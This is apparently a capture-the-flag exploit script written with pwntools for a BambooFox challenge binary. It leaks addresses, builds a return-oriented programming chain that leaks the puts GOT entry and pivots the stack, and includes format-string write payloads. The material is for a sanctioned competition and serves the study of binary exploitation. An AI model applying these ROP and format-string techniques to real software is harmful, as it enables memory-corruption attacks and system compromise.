#!/usr/bin/python3

from pwn import *
import sys
import subprocess

elf_name = './R'
libc_name = './libc-2.29.so'
e = ELF(elf_name)
libc = ELF(libc_name)

context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'

if len(sys.argv) > 1:
    r = remote('chall.ctf.bamboofox.tw', 10100)
else:
    r = gdb.debug(elf_name, env={"LD_PRELOAD": libc_name}, gdbscript='''
    b *0x00005555555553ed
    c
    ni
    ''')

if len(sys.argv) == 1:
    pid = r.recvline()[:-1].split(b' ')[-1].decode()
    child = gdb.attach(int(pid), gdbscript='''
        ''')
r.recvuntil('Gift1: ')
s_addr = int(r.recvline()[:-1], 16)
r.recvuntil('Gift2: ')
code = int(r.recvline()[:-1], 16) - 0x138b

log.info(f"s: {hex(s_addr)}")
log.info(f"code: {hex(code)}")
"""
pipe Xc88
22(ee08) -> 63(ec88)
%60424c%22$hn
%0c%63hnn

%60428c%22$hn
%1c%63hnn
"""
pop_rdx_ret = 0x0000000000001a53 + code
pop_rdi_ret = 0x0000000000001abb + code
pop_rsi_r15_ret = 0x0000000000001ab9 + code
pop_rsp_pop_r13_pop_r14_pop_r15_ret = 0x0000000000001ab5 + code
pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret = 0x0000000000001ab2 + code
pop_rax_ret = 0x0000000000001a4f + code
pop_r12_to_r15_ret = 0x0000000000001ab4 + code
ret = 0x0000000000001016 + code
leak = 0x578

write_ROP = flat(
    pop_rsp_pop_r13_pop_r14_pop_r15_ret,
    s_addr + 0x600,
    b'A'*(0x5f0 + 8 + 8 + 8),
    pop_rdi_ret,
    e.got['puts'] + code,
    e.sym['puts'] + code,
    pop_rax_ret,
    0x1,
    pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret,
    0x31,
    s_addr + 0x730,
    s_addr + 0x720 - 0x70,
    0,
    0,
    0,
    pop_rsp_pop_r13_pop_r14_pop_r15_ret,
    s_addr + leak - 0x10,
)
write_ROP = write_ROP.ljust(0x720, b'A')
write_ROP += p64(0x0000000200000006) + p64(0) # 0x720
write_ROP += b"A" + b"AAAABBBB"*4

"""
s_addr + 0x660 ~ _ + 0x70 == fd
"""

prefix = 'MQ'
payload = "%60422c%22$hn%20c%63hnn"

sleep(0.2)
r.sendlineafter('Give me chain :', write_ROP)

r.interactive()
